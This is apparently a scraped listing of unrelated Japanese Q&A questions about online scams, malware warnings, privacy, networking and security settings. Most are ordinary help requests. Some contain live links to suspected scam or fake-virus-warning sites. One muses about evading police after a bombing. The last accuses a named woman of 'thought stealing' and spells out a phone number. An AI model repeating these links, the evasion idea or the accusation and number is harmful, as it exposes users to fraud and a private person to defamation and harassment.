名誉毀損について質問します 企業、団体のお問い合わせフォームに名前を書き込んだ場合名誉毀損に当たりますか?? 悪質なファンについての対応について質問する際、その悪質なファンの現状を報告するときに相手の本名を記入してしまいました。 この場合名誉毀損、そして逮捕などに発展することはありますか??
今は、迷惑メールに対して若年者は慣れきっていて、年配者は気にし過ぎる時代ですか？
インスタグラムに映像と一緒に音楽も付けて投稿した所、著作権の恐れがあるため弾かれました。 画像アップの瞬時に弾かれる、著作権チェックの優秀さに驚きました。 あの数秒で著作権侵害を見極めるシステムを簡単に分かりやすく教えて欲しいです。 ちなみに弾かれた理由は音楽でした。 某アーティスト（インディーズレーベル）自体は世間一般では有名では有りませんが、きちんとアーティスト名とタイトルまで著作権侵害の理由に書かれてました。 ちなみに投稿する時に、文章、ハッシュタグなどにアーティスト名、タイトルなどは記載してませんでした。 これからは著作権に気をつけて投稿しようと思います。
悪質なファンの対応について公式サイトのお問い合わせフォームに質問したのですが、ネットで炎上している悪質なファンの現状を記入する際に相手の名前を記入してしまいました。この場合逮捕、もしくは訴訟になったりするのでしょうか?? 衝動的に行動してしまい後悔しています。
ポート開放をしているときに今どの番号が開いているのかな？と思い確認して 出てきた番号をいろいろ調べたところ 5000番というのが危険とネットに載っていて質問させていただきました 本当に危険なんでしょうか?? 対処法があれば、お願いします
よく大学を爆発予告したりしますが本当に爆発したら警察はどう捜査するんでしょうか？昼間学生に紛れて仕掛ければ住民にも聞けないし、センサーも防犯カメラも吹き飛ぶから捜査しようがなくないですか？
最近Acerのw3 810 を買ったのですがネットからフリーゲームをダウンロードしようとすると2～3時間と表示されます。これを早くする方法は、ありませんか？
DVDのコピーが分かりません。 子供の為に家でも見える様にとＤＶＤＲ－Ｍを購入してレンタルしたＤＶＤをコピーしようと思いましたができません。使ってるパソコンは、レボノのＧ50のノートパソコンです。 ＤＶＤドライブは一つついてるんですが、よくわからなくて困ってます。 ネットで見て試してみたんですが、コピーしたＤＶＤの方がモザイクっていうか、ガタガタな状態でパズルみたいになってて、とてもＤＶＤとして見れるものじゃありません。 できればフリーのソフトからうまい事コピーをしたいんですがご存じの方いましたらよろしくお願いします。
佐賀県の高校のデータ不正アクセスは単に17歳の少年に実力があったということでは？日本では既得権が潰しにかかるけども、アメリカでは逆にハッキングのプロとして賞賛される。 素直に既得権の実力不足だと認めろよ。少年にハッキングされるようなセキュリティしか作れない。されたくないのならセキュリティを強化すれば良い。 理屈としては家の玄関の鍵をかけないで、大金を置いといて泥棒に取られた。 鍵がかけてあれば取られなかった。銀行に預けてれば取られなかった。 これは対策しなかった取られた方が悪い。さも取って下さいという風にしといて取った方が悪いとなるのが日本。 日本に一人の逸材が現れないのもこういう組織体制にあると思うんだよね。
Google Analyticsの新UIでフィルタ設定の項目が無い2016年、Google AnalyticsのUIが新しくなったようですが、リファラスパムを排除するためのフィルタ設定が見当たりません。以前は画面上部メニューの「アナリティクス設定」の「ビュー」から「フィルタ」を選んでいました。 依然としてリファラスパムの攻撃を受けており、フィルタが設定できないと困ります。新UIにおいて、フィルタ設定はどこにあるのでしょうか。
たった今、ネットの2ちゃんみたいな所をクリックしたら、この画面が出てきて、バッテリーがウイルス感染中！と出てきました。 アプリのコメントには、騙されるな！と書かれていましたが、アプリの宣伝なんでしょうか？ https://clicklink8.com/gdu/jpash3.html?model=Aquos%20Phone%20XX%20Mini&brand=Softbank&voluumdata=BASE64dmlkLi4wMDAwMDAwMi01ZmEzLTRhZTQtODAwMC0wMDAwMDAwMDAwMDBfX3ZwaWQuLmE3OWJiODAwLTUxMDctMTFlNi04NmJjLWUwZWExNTY2NWEzZV9fY2FpZC4uMTdjMDhhNmEtNjk2Yi00MDgxLWI5NmEtNmI4ODIzM2ZlMDBkX19ydC4uUl9fbGlkLi40NDk1NzNlNy1lZmRhLTRhZTQtYmMxOC04NTkzYmNmN2UwYWJfX29pZDEuLmFhODk5MzM5LTQ5M2UtNDBjYi04NmRhLWZkZDU0M2EzMTQ4NV9fdmFyMS4uNzA5ODE2X19yZC4ub25jbGlja2Fkc1wuXG5ldF9fYWlkLi5fX2FiLi5fX3NpZC4u&zone=709816&cid=197333103298 怖いので何方か回答お願いします！
至急！2ちゃんねるに書き込んだら自分のIPアドレスを晒してしまったみたいです。名前の欄を空白にして書き込んだら代わりに自分のIPアドレスが入力されてました。 一部伏せますが 1○○-1○○-2○○-2○○が.rev.home.ne.jp と出てしまってました。 これってIPアドレスですよね？ 自宅がバレてしまいますか？ 早く消したいのですが消しかたがわかりません。どうしたらいいでしょうか？(;o;)
至急！詳しい方よろしくお願いします！ お礼ありです 電動自転車を購入しようと思い、ネット検索していたところ こちらのサイトを見つけました。 あまりに安すぎるのですが 詐欺でしょうか？ 専門的な知識のある方、よろしくお願いします。 http://www.cxo-web.top/order/item/1000.html
これってポチッとしたらダメなやつですよね？？
社内パソコン（OS：Windows7）はワークグループとドメインの2種類共存しています。その中でワークグループ配下にNAS（LANDISK）を接続しているのですが、 もともと同じワークグループのパソコンとドメイン配下のパソコンの 両方から参照できていたのが、突然ドメイン配下のパソコンから接続できなくなりました。 「DISK１にアクセスできません。 このネットワークリソースを使用するアクセス許可がない可能性があります。 アクセス許可があるかどうかこのサーバーの管理者に問い合わせしてください。 指定されたサーバーは、要求された操作を実行できません。」 というメッセージが表示されます。 どの様に対応したらいいのかわからず、I-ODATAに問合せしましたが、 I-ODATAの問合せ担当者に言われた「ネットワークセキュリティの”LAN Manager認証レベル”を ”LMとNTLM応答を送信する。（ネゴシエートした場合・・・）”」に設定しましたが、 やはり接続できませんでした。 ほかに方法は無いのでしょうか？
こんばんは今回はVPN？のソフトについて質問です。 VPN Autoconnectというソフトを使ってよく分からずにフロリダやUKのネットワークに繋いでしまいました... http://www.usaip.eu/en/vpnautoconnect.zip お金がかからないか心配です。 初心者でVPNが何なのかもよく分かっておりません。 ネットでよく載ってるVPNのお金はソフト自体のお金なのか、それとも接続料なのか分からず大変不安です。 通信料などを取られたりするのでしょうか？？ どなたか回答よろしくお願いします。 無知の状態でやらなければよかったです。
知らない番号（固定電話）から電話がくるのですが、調べる方法はありますか？？ネットで調べても該当がありません。
VirtualboxとTeraTermをホストオンリーネットワークで接続したいのですが、 Virtualboxの環境設定でホストオンリーネットワークを新たに追加したところ、 Virtualbox Host-Only Ethernet Adpterが追加され、IPアドレスは192.168.197.1に対し、IPv4ネットマスクが0.0.0.0で、 それだと、無効な設定となってしまい、保存出来ません。 さらに、ホストオンリーネットワークを増設し、Virtualbox Host-Only Ethernet Adapter #2が追加され、 IPアドレスが192.168.277.1に対し、 IPv4ネットマスクが255.255.255.0と割り当てられました。 その後、先のVirtualbox Host-Only Ethernet Adapterを除去し、 #2のホストオンリーネットワークのみにした場合、無効な設定とはならず、OKして保存出来るのですが、 暫くすると、Virtualbox Host-Only Ethernet Adapter #2の255.255.255.0であったはずのIPv4ネットマスクが0.0.0.0に変更されてしまい、それだとまた無効な設定となってしまいます。 手動で0.0.0.0と変更されてしまったIPv4ネットマスクを255.255.255.0と変更しても、その時はOKして保存できるのですが、暫くするとやはり0.0.0.0となってしまい、無効な設定が見つかりましたと表示され保存できなくなってしまいます。 解決方法を教えてください。
近年おこったネットワークの「個人情報漏洩事件」または「不正アクセス事件」について教えて下さい。またその事件の原因と再発防止のための対策も加えてお願い致します。
フリーWIFIの危険性 フリーのWIFIは個人情報収集をする人達がいると聞きます ですがフリーのWIFIを使いたいと思う人もいます。そこでフリーWIFIを使いながら少しでもその危険性を減らすには？ スマホやノートPCに入っている（入れた）アンチウィルスソフト（カスペルスキーなど）を 入れていてもフリーWIFIに対しては意味がないですか？ VPNソフトを入れるしかないのでしょうか？
安くてカワイイ雑貨通販サイトはありますか？出掛ける機会がなかなか無いので、ネットで ヘアゴムやヘアピンなどの雑貨や小物を買おうと思います。 条件は下記のとおりです。 ・日本サイト ・安くてカワイイ ・登録しても迷惑メールが来ない ・小学生でも使える雑貨が売っている。 サン宝石くらいしか知らなくて……（−＿−；） 回答お願いします。
アバストアンチウイルスの 「アバストインターネットセキュリティ」というのを購入したのですが ライセンスが認証できません。行った作業手順 有償ライセンスの再送 ↓ メール内のライセンスファイルをダウンロード ↓ アバスト-設定-申し込み-ライセンスファイルを入れる ↓ メールの添付ファイルを選択 ↓ そのライセンスファイルを読み込む事は出来ません。 署名が無効です。このライセンスファイルは破損しているか改竄されています。 という流れになります。 有償ライセンスは6月に購入しましたが、勝手にアップロードされると思いしていませんでした。 サポートが日本語対応していないのでこちらで質問した次第です。 どなたか詳しい方、アドバイスをよろしくお願いします。
vペリカというネット専用クレジットカードを使って継続課金のサイトに登録したのですが 期限が来たら残金不足で継続課金されずに自動退会的な扱いになるのでしょうか？ よろしくお願いします。
軟質ポリウレタンフォーというものを探しております ホームセンターに行っても見つかりませんでした ネットでも直接でもいいので買えるところを教えて下さいなるべく長さなどの指定ができるものが一番嬉しいです
閉じた方が良いとされるポートをホームゲートウェイの管理画面で拒否するように設定しようと思っているのですが、WAN→LAN方向だけでなく両方向を拒否した方が良いでしょうか？ 閉じるポートの参考にしようと思っているのはこちらのサイト http://homepage1.canvas.ne.jp/mycroft/dat/security/port.html です。
技術決定論 社会決定論 技術の再解釈 社会構成主義 これらの言葉の意味を教えて下さい。
出来るだけ早くお願いします！ワンクリック詐欺にあってしまいました 私はYouTubeで動画を見ようと思ったのですが、たまにはWebで検索して見ようと思いました。 検索したら私が見たい実況動画がありました。 タップしようと思ったら誤って違う動画をタップしてしまいました。 すると【制約ありがとうございます！】と表示されていて、【振込お願いします】と書かれていました。 怖くなって、金額も見ずにそのままサイトを消して、履歴も消しました。退会はこちらとか書いたのですが、怖くても冷静に考えると問い合わせする方が危ないと思ったから消したのですが… 私の選択はあってたのでしょうか？ これから振込請求やメールは来ないのでしょうか？ 個人情報はバレてないのでしょうか？ 教えて下さい！
ヤフオクにアクセス出来なくなって困っています。 一昨日までは普通にアクセスできていたのですが。。。今朝、ログインしようとすると This website is blocked by your network operator. If you feel you have received this message in error, please contact your network operator with the following information: URL: http://auctions.yahoo.co.jp/ Category: Auctions あとサーバーの数字が続きます。 他のヤフーのサービスは普通に見ることが出来るのに… どのような手順を踏めばまた閲覧可能になりますか？ どうかお知恵をお貸しください。 よろしくお願いいたします。
intellitermというプログラムについて質問です。最近、ネットを開くと 突然「おめでとうございます！」 とかRedirect みたいなタブからいろんな特定のサイトに繋がれて たまに音声も流れてきます。 それで調べたらプログラムを消したらいいと書いてたので消そうと思うのですが、 intellitermというのは消してもいいのでしょうか？？
プレイステーションネットワークのパスワードを忘れてしまい、変えようと思ったのですが、当初登録したメールアドレスから変わっており、変更出来ずに困っています。 この場合はどうすればいいのでしょうか？ メールアドレスを変更したくても出来ないし、パスワードも変更できないし……(泣) 助けてください……
溜まり醤油はトトロですか？溜まり醤油はトトロですか？
ネットで自分の名前を検索するとTwitterの自分のアカウントが出てきちゃうんですけど消すにはどーすればいいですかね？
複数のアカウント管理 ネットをしているとどうしても、さまざまなサイトに登録していて管理に困っています。 どのようにアカウント管理していますか？
PCで爆サイを見ていたらマルウェアRSA4096に感染したことがありました。ウィキペディアやYouTubeも良く閲覧します。これらをネットサーフィンしていてウィルスやマルウェアに感染することはあるのでしょうか？
現在、自分のサイトのURLをhttpsにする為にSSLを設定しています。 さくらのVPSで運営しています。 以下のURLを参考に秘密鍵とCSRを作成したのですが、ここで少しつまずいています。https://www.ssl-store.jp/support/install/apache/ 作成したCSRの中身を除くために openssl req -noout -text -in domainname.csr のコマンドを実行したのですが、ファイルの中身がいろんなサイトで確認したものと異なっています。 一般的なものはファイルの中にこういった記述があるようなのですが、見当たりませんでした↓ -----BEGIN CERTIFICATE REQUEST----- ・・・暗号化情報・・・ -----END CERTIFICATE REQUEST----- 実際の私のファイルの中身はこのようになっています。 Certificate Request: Data: Version: 0 (0x0) Subject: C=xx, ST=xx, L=xx, O=xx, OU=xx, CN=xx Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (2048 bit) Modulus: 44:4f:xx:xx:xx:xx:xx:xx:xx:xx:xx: fe:35:xx:xx:xx:xx:xx:xx:xx:xx:xx: fe:35:xx:xx:xx:xx:xx:xx:xx:xx:xx: (省略) Exponent: xxxxx (xxxx) Attributes: xx:xx Signature Algorithm: sha1WithRSAEncryption 0c:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx: xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx: xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx: (省略) CSRの中身は16進数ではなく全てのアルファベットと数字で構成されているはずなので、おかしいと思いました。 ただ、このサイトを見ると http://christina04.hatenablog.com/entry/2011/12/01/214445 『「CERTIFICATE REQUEST」という文字列があればほぼ間違いないでしょう。』 と書かれていて、私のファイルの最初に「Certificate Request:」という文字があるので、余計に分からなくなりました。 CSRが正しく作成できているのか、もし間違っている場合、正しいCSRの作成手順をどなたか教えていただきたいです。 よろしくお願いします。
携帯のメール等をのぞき見するのではなく、今は遠隔で相手のネットを利用した内容やショートメールを遠隔で見ることが簡単にできますか？携帯ショップで何年も仕事をしていたらできますよね？それは夫婦であっても犯罪ですか？立証するのは難しいでしょうか？
いつだったか、ワイドショーでスマホで位置検索をonのままスマホで撮った写真をSNSにアップすると、パソコンに詳しい人ならアップした人の自宅など簡単に解ってしまうというようなことを言ってました。ほんとにわかるのでしょうか？私は其処ら辺疎いのでいまいちピンときません。もしほんとなら怖いなって思います。
友達が勝手に友達のスマホを私の家のWi-Fiに繋いでいたので 無線LANのパスワードを変え、MACアドレスフィルタリングをつけたのですが、何故かまだWi-Fiが使えます どうしてですか？ 友達にWi-Fiを使わせない方法はないですか？
マカフィーウェブアドバイザー ダンボールに入ってるんですけど…。これって必要ですか？
ラクマでsupreme20thのTシャツを買いましたですがネットで調べたところ偽物のような気がしてきました。もし偽物だった場合、ラクマを運営しているとこに言えばお金は戻ってきますかね？ ちなみに写真はこれです
ネットで調べ物をしていた時に見ていたページにあった動画を開こうと思いタップしたところ1日以内にお金を振り込んでくださいという趣旨のページが出てきました。戻るボタンを押しても何回も出てきました。個人情報が送られました、などと書いてあったのですがこれは今流行りのワンクリック詐欺というものでしょうか？無視しても大丈夫ですか？ よろしくお願いします
スマホウィルス感染？について。 息子からChromeでゲームのまとめサイトを閲覧していたらGoogleと書かれたサイトに飛ばされスマホがウィルスに感染していると表示されたと言われました。スマホの画面を確認すると使っている機種名とアダルトサイトで感染しましたと表示されており、戻るボタンで戻らせChromeを閉じさせました。 本人もアダルトサイトを過去に閲覧していたとの事でアダルトサイトが危険である事を伝え、閲覧履歴やクッキー等すべて削除させその上でスマホのウィルス検査をさせました。スマホにインストールされているアプリも確認しました。 ウィルス検査でも特に問題も見付からなかったので何かに感染している様では無いのですが、息子は凄く心配している様子です。 現状では、最善だと思う事をしてやれたと思うのですが、他にもしてやれる事、しなければならない事があるのではと思い質問させて頂きます。 回答宜しくお願いします。
Lavie HZ750/AのWi-Fi設定について施設のWi-Fiを家で設定したいのですが、どのようにすれば良いでしょうか。 そのWi-FiをiPhoneで使う場合は、ネットワークを選択のその他の所で設定します。 宜しくお願いします。
ディジタル署名でハッシュ関数を用いる理由は成りすましを防ぐためですか?
これで、９条改正は確実ですね。 良かったね。 私も、ハッカー紛いな者だから、 将来は、サイバー兵士として、 戦争に行くお。 一緒に行きたい人はいるかな？
これって詐欺？ 「王の顔」OSTのCDをネットで購入しました。 購入サイトは日本語標記で疑いもなくクレジット決済。 注文確定の通知はけったいな日本語で…？ ２週間以上経っても届きません。 佐川急便の問い合わせ番号の記載された英文メールが届いたのですが 問い合わせてみると既に配送済み。 ましてや、宛先が東京千駄ヶ谷のアパレル会社でした。 私は神戸です！ サイトの問い合わせメールで届かないことを通知したのですが、 返事もありません。 とほほ…です。
金曜日にニトリにて買い物をして 荷物が大きかった為配送してもうようにして 明日月曜日に届くのですが 時間帯を変更したいのですが電話したら 変更できますかね？？ネットで注文したわけじゃないので 出来るかどうか分からなくて。 直接店舗で買って配送の時間帯を変更したことある方教えてくださあ。
cloud edge 2.8の既知の不具合について 会社で上記の装置を付けているのですが、 下記サイトの既知の不具合の1番の証明書の不具合が発生しています。 ただ、設置会社に問い合わせても1ヶ月以上経っても何の返答もなく困っています。 設置会社に頼ってられないので、個人直すことは出来るのでしょうか？ 不具合について http://docs.trendmicro.com/all/smb/cemsp/v2.8/ja-jp/CloudEdge_2.8_R...
Windows 7は、いつまで使えますか？
さっき、ネットに個人情報を晒したと言われました 本当でしょうか？ちょっと怖いです。誰か助けてください。 http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q1016141913... このサイトです
突然知らない人から弟の電話に、いたずら電話が昨日からかかってきます。私の電話にも、かかってきました。１日に10～60件ほどかかってきて、電話に出ても相手はなにも言いません。今日はこの状態が続いて9分が経ちました。そして、相手は電話を切りました。弟のSNSに、相手からメールがきて、なぜか私の名前と住所が全て特定されていました。母と警察で相談して、いたずら電話の相手のことを話すと、どうやら相手は性犯罪者で逮捕歴が1回あるらしいです。相手が、弟にSNSで私の家に行くと言ってきます。住所も特定されていますし、逮捕歴のある人ですから、ほんとうに怖いです。 弟や私の電話番号から、どうやって住所を特定できたかわかる人いますか？ 母は、私のGoogleのアカウントとかでバレたんじゃないかと言っています。 ほんとに怖いです。夜も眠れません。 ほんとにつらいです。
ネットでアダルト動画を見てたら「カード情報などが流失した恐れがあります」的な メッセージが出てきたのですが、これはやはり、今すぐカード会社に電話したほうが良いですよね？
私がWi-Fi接続をしてネットをすることで、 ナットタイプがクローズになったと 息子にキレられ、クソだのバカだの 暴言を浴びました。 私には何のことかすら理解できず どうしてくれるんだと言われても 私は自分が何をしたかも理解 していません。理解できないなら スマホ使うなとも言われましたが スマホを使わない生活は不可能です。 私がネットでしていることは、 LINEをしたりYahoo!で天気予報を 見たりニュースを読んだり…と 特別 何かをした訳では ありません。 それでも何故、私がWi-Fi接続をして ネットすると このようなことが 起きるのでしょう。また どうすれば 良いのでしょう。この相談をどこへ すれば解決するのか、それとも Wi-Fi接続しなければ良いのか、 どなたか教えて頂ければと思います。
防犯カメラの設置を考えており、いいなと思うカメラはネットワークカメラばかりですが、家にはインターネットを引いていません スマホでリアルタイムで映像を確認したいわけではなく、何かあった時に見返したいだけですが、ネットワークにつなげなくても、電源さえ入れていれば録画されている（防犯カメラとして使える）と考えてよろしいのでしょうか？
警察は頼まれたら番号で居場所を探せるんでしょうか？以前、夜のお店で働いていてやめたくても辞めさせてもらえず、飛びをしました。 その時付き合っていた彼の家に引越しまでして、決してバレるはずはないのに、なぜか知られていた事があり、警察の方とも繋がりのある店長さんだったのでそれしか考えられず(^_^;) 幸い、何も無かったので良いのですが、気になりました。
現代の日本の発展に原子力発電所も挙げられる。 エネルギー産業には難しい問題でもある。 賛成、反対。３，１１被害者の意見も問わない。 この２つの事象を一様に断じてはいけないが、あえて問う。色々な考え方、意見下さい。政府にて参考にします。 恐がりの意見は求めないので自信のある者に求める。 参考になる意見を求める。感覚でも考えでも良い。
大至急！！！ ネットを使っててこんなのが出たんですけど 悪質なやつですか？？それとも本物の警告？？すぐ教えてください！
私はあと１週間後にホームステイをします。はじめてでしかも３週間もホームステイなのでとても不安です。先日、ホストファミリーにメールを送ったのです3日くらいたっても返事がありません。 ほかの質問にはHotmailは届きにくいとか、返事が来ない方が普通などが書いてありました。父に聞いてみるとセキュリティが固かったらそもそもきちんと向こうまで届かないていないかもしれないと言われ大変不安です。 なので、もう1度メールを送ろうと思うのですが、外国人からしたら同じメールがもう1度来たら、鬱陶しいな、急かすなよ、とか思うものなのでしょうか？ ご回答お待ちしておりますm(_ _)m
wimaxの左上にある扇形のマークがいきなり出てきて、しかもネットがつながらなくなりました。 どうすればつながりますか？
これの対策教えてください。履歴を消すと治るとありましたが効果なし。あとこれ違法じゃないんですか？
AWSのEC2を使っています。 ある時から突然"yam"や"minerd"という 謎のコマンドが毎分勝手に実行され、 強制的に常時LAが4-5位になってしまうようになってしまいました。友人に相談したところ 「yum updateしたら問題のあるライブラリが正常化するかもしれない」 という意見を貰ったため試してみたことろ改善しません。。 何かしらのセキュリティホールがあるのか、 設定が不足しているのか分かりませんがとにかく不便で困っています。。 〇インバウンドの設定 ----------------------------------------------------------------------- カスタム TCP ルール TCP 16379 0.0.0.0/0 HTTP TCP 80 0.0.0.0/0 カスタム TCP ルール TCP 9000 0.0.0.0/0 SSH TCP 22 0.0.0.0/0 カスタム TCP ルール TCP 10000 0.0.0.0/0 カスタム TCP ルール TCP 6379 0.0.0.0/0 カスタム TCP ルール TCP 10443 0.0.0.0/0 カスタム TCP ルール TCP 10001 0.0.0.0/0 カスタム TCP ルール TCP 27017 0.0.0.0/0 HTTPS TCP 443 0.0.0.0/0 ----------------------------------------------------------------------- 情報が不足しているかと思いますが、 なにぶん原因が分らないため何を開示すれば良いかも分からない状態です。 どなたか対応策で結構ですので、ご教授頂けませんでしょうか。 宜しくお願いいたします。
iPhoneで、ヤフーメールのウィルスを開いてしまった場合、感染しますか？ また、パソコンで開いていなくても、携帯で開いてしまったら、パソコンも感染しちゃいますか？
外に倉庫を設置しようと思い、以前からネットで探しておりました。いろいろなサイトを見てるうちに、あるサイトに当たり、安く購入できると喜んでおりました。会員登録を済ませ、購入手続きをしていたところ、他のサイトに比べて安いこともあり何か引っかかる部分があります。詐欺サイトでなければいいのですが、皆さんの意見も聞いてみようと思い質問いたしました。ちなみにサイトは、http://www.pplwbc.topというサイトです。 もし詐欺サイトならば、会員登録した手前、個人情報の流出も怖いため自分のパスワードはひと通り変えた方がいいですかね？ よろしくお願いします。
Gmailをログインして開けたところ、新しいメールが届いていました。 Googleからで、新しいデバイスでの（Android)ログイン成功とのことです。 私のパソコン環境は変わっていません。今までの履歴はWindowsだけで、住所もOKです。 このAndroidに心当たりがない場合、だれか他者がログインした可能性があるとのことです。 このデバイスに心当たりがない場合、のあと、確認するのにパスワードを入れるのも気が進みません。 やはり誰かにパスワードを読まれたと考えるべきでしょうか？ ちなみに、ネットバンキングなどは、Gmailは一切使っていませんが、最悪、パソコンの中に入っているものは読まれてしまう、と考えたほうがいいのでしょうか？ これから何をすべきか教えてください。
httpsから始まるURLのサイトにアクセスした時、もし接続しているルーターがスニッフィングなどの攻撃を受けていたとしたら、その通信の内容を攻撃者はどこまで知ることができるのでしょうか？どのサイトに接続したか、どのページを開いたかといったことも分かりませんか？
FREE ドキフレ♪ というところから迷惑メールが届きました。 こちらの情報元として考えられるルートをご存知の方いらっしゃいましたらお願い致します。
「チップマウンター」について ネットで調べてもいまいちピンとこなかったので この機械は、基盤に電子部品を配置する装置 これだけですか？つまり、製品を作るための製品（工場とかで使われるだけで、表に出るようなものではない）という事ですか？ それとも身近に、チップマウンターが使用されている製品とかはありますか？
全角？ってこれでいいんじゃないんですか？やってもずっと赤字の文字が出てきます！ ちなみに今は、質問のため、名前は変えてあります。
macbookproをオークションで購入したのですが、前のユーザーのログインした状態で送られて来ました。 購入時は工場出荷状態で送ってくれると言っていたのですが、これからどのようにすればいいのでしょうか？ macは初めてなので知識がありません。 詳しい方に教えていただきたいです。 どうかよろしくお願いいたします。
防犯カメラについて質問です。私はアパレルの販売をしているのですが、館内のお知らせで閉店後に他の店舗の従業員が万引きに入ったという手紙が届きました。 発覚したのは、とある店舗の方が閉店後に店頭のネットを閉めて帰宅し次の日来てみたらいくつか商品がなくなっていたということです。 なのでどこの店舗の人がやったのかはわかっておりません。 そこで質問なのですが、館内の防犯カメラは一日中作動しているのではないのでしょうか？（CMでもやるほどの大きなショッピングセンターです。） また、各店舗にも防犯カメラがついているはずで（私のお店にはついていて、本社が管理していると聞きました）閉店後に電源を切るのですが、電源を切ってしまったら防犯カメラは作動していないのでしょうか？
windows7です。マルウェアに感染しました。 Malware Protectorの無料版を使用してマルウェア感染を確認しました。しかし「すべて除去する」のボタンを押すと有料版への案内が表示され、除去を完了してくれません。 除去するにはどうすればよいでしょうか。 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 【名前】 ＜感染ファイル名＞ malware.gen-r ＜カテゴリー＞ Generic Malware ＜脅威レベル＞ High ＜実行されたアクション＞ NoActionTaken ＜感染発見数＞ 4 【感染発見数】 ＜発見されたエリア FileSystem ＞ ＜詳細＞ ＜ファイル名＞ c:\windows\winsxs\amd64_microsoft-windows-notepadwin_31bf3856ad364e35_6.1.7601.18917_none_a0f2c3fc11a9f24c\notepad.exe ＜MD5＞ 0 ＜署名＞ 10220155893120331515 ＜Md5hash:＞ b32189bdff6e577a92baa61ad49264e6 ＜発見されたエリア FileSystem＞ ＜詳細＞ ＜ファイル名＞ c:\windows\winsxs\amd64_microsoft-windows-notepadwin_31bf3856ad364e35_6.1.7601.23120_none_a16a66f72ad62fe8\notepad.exe ＜MD5＞ 0 ＜署名＞ 10220155893120331515 ＜Md5hash:＞ b1dd1e3732e7f600167632f5bbda619e ＜発見されたエリア FileSystem＞ ＜詳細＞ ＜ファイル名＞ c:\windows\winsxs\amd64_microsoft-windows-notepad_31bf3856ad364e35_6.1.7601.18917_none_cd438498869c9ff6\notepad.exe ＜MD5＞ 0 ＜署名＞ 10220155893120331515 ＜Md5hash:＞ b32189bdff6e577a92baa61ad49264e6 ＜発見されたエリア FileSystem＞ ＜詳細＞ ＜ファイル名＞ c:\windows\winsxs\amd64_microsoft-windows-notepad_31bf3856ad364e35_6.1.7601.23120_none_cdbb27939fc8dd92\notepad.exe ＜MD5＞ 0 ＜署名＞ 10220155893120331515 ＜Md5hash:＞ b1dd1e3732e7f600167632f5bbda619e －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 【名前】 ＜感染ファイル名＞ worm-email.generic ＜カテゴリー＞ Email-Worm ＜脅威レベル＞ High ＜実行されたアクション＞ NoActionTaken ＜感染発見数＞ 1 【感染発見数】 ＜発見されたエリア＞ Registry ＜詳細＞ ＜レジストリキー＞ hkey_local_machine software\classes\.bod －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 【名前】 ＜感染ファイル名＞ Restricted Settings ＜カテゴリー＞ Security Disabler ＜脅威レベル＞ Medium ＜実行されたアクション＞ NoActionTaken ＜感染発見数＞ 1 【感染発見数】 ＜発見されたエリア＞ WindowsSettings ＜詳細＞ レジストリキー hkey_local_machine software\clients\startmenuinternet\iexplore.exe\shell\open\command －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ よろしくお願いいたします。
Windows 7 から Windows 10 パソコンに買い替えた者です。＊先日 Windows 7 が入ったパソコンが故障し、『 修理も不可 』との事なので、やむなく Windows 10 の入っている新品のパソコンを購入しました。 パソコンの中身は、外付けハードディスクに 丸々入れていた為、特に大きな問題はなかったのですが、その外付けハードディスクの中には、当然『 Windows 7 時のバックアップ 』が入っているのです。今現在 使用中なのは Windows 10 です。 現在、新品の Windows 10 入りパソコンに、旧パソコンの Windows 7 の 時に使用していた 外付けハードディスク を""ただ単純に繋いで使用している""のですが・・・この 『 Windows 7 のバックアップ 』はセキュリティ上削除した方が良いのでしょうか？？。 ある意味 Windows 10 と Windows 7 が混在？？ している状況はまずいですか！？ 入れているセキュリティソフトの ノートン は結構ガッチリ守ってくれていて、今のところ不調も無く、変な広告なども一切出てこないのですが・・・ Windows 10 を使用していながら、外付けハードディスク には Windows 7 のバックアップが入っている。この状況はかなり危険ですかっ！？！？ ＊実は以前にも、↑ これと同じ内容の質問を致しました。 http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q1315957086... お二方が回答して下さったのですが、その後やはり心配になりました。 私の Windows 10 のパソコンが、完全に Windows 7 のバックアップを Windows 7 と認識しているからです・・・。画像をご覧下さい。 バックアップと復元でも(画像上)、（ Windows 7 ）と、デフラグラーなる デフラグソフト でも Windows 10 の中の Windows 7 を完全に認識しています(画像下)。『 システムイメージ 』も同時に作成するバックアップなので そのシステムイメージを Windows 7 と認識しているのでしょうが、やはりこのバックアップ。 今のうちに削除しないと（色々な意味で）危険でしょうか？？ 詳しい方お教え願います。 出来れば削除したくはないのです。
お店の監視カメラについて買い物に行った時にたくさんの監視カメラがあるのを見て思ったのですが 例えばの話でもし誰かが万引きを何度かしたとしてそれが捕まってなかったとしてお店側はその万引き犯の顔などを完全にマークしてたりするんですか？ あと万引きをしたら捕まる人は普通にいるのにネットなどで調べてみると捕まらずに監視をくぐり抜けたなんていう人はどうして出てくるのでしょうか ２つめの質問に関しては思っていることでも構いません ご回答よろしくお願いします カテ違いでしたらすみません
tokumeihasiraさん 2016/6/2518:34:18 . 思考盗聴グループの一員判明 勇気をだして報告します。私はされていませんが私の友人です。私の友人のｍａｙａｈａｓｉｒａ大阪府在住 昔はクラブなど一緒に行って遊んでいましたが、私の友人などにも過去パソコンなど使いネット社会で言われる思考盗聴をしている模様犯人はmaya hasira 女性３０代半ばです。そのような行為をするグループで活動しているので犯人彼女たちでしょう 現在知らない人にしているでしょう！！体験は 思考盗聴とはオカルトと私も思っていましたが仲のいい男友達がされ続け困惑をこしている状況を見かけて同じ思いをしているかた犯人はわかっていますよ。彼女は知らない携帯を思考盗聴で経た番号を通話拒否している場合ありますが負けないで下さい。にげているのでなにかあればこちらに ゼロキュウゼロ ハチヨンハチニ ゼロキュウロクナ私は被害者を助けたいので被害者の方この携帯がmaya hasira http://www.geocities.jp/techhanzainetinfo/01hajimenih.html 補足 http://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q1414804862... 上記の犯人も彼女たちのグループの可能性あり 補足 私も非現実なことを信用するタイプではありませんが被害者の友人を２人以上知っております。信用されない方下記の相談を見てください http://chiebukuro.yahoo.co.jp/tag/tags.php?page=6&tag=%E3%83
